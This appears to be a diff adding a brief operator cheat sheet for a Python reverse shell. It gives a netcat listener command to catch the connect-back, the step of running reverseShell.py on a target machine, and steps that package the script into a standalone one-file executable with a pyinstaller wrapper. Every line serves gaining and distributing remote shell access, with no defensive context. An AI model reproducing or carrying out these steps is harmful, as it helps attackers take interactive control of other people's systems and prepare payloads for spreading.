@@ -1,0 +1,17 @@
+~~~ Access Python Remote Shell ~~~
+
+nc -lvp 1234 # listen for connect back
+
+python reverseShell.py # execute reverse shell script on target
+
+id
+
+
+~~~ Create Standalone Reverse Shell ~~~
+
+mkdir /shared
+
+cp reverseShell.py /shared
+
+cnoio_pyinstaller -y --clean --onefile /shared/reverseShell.py
+
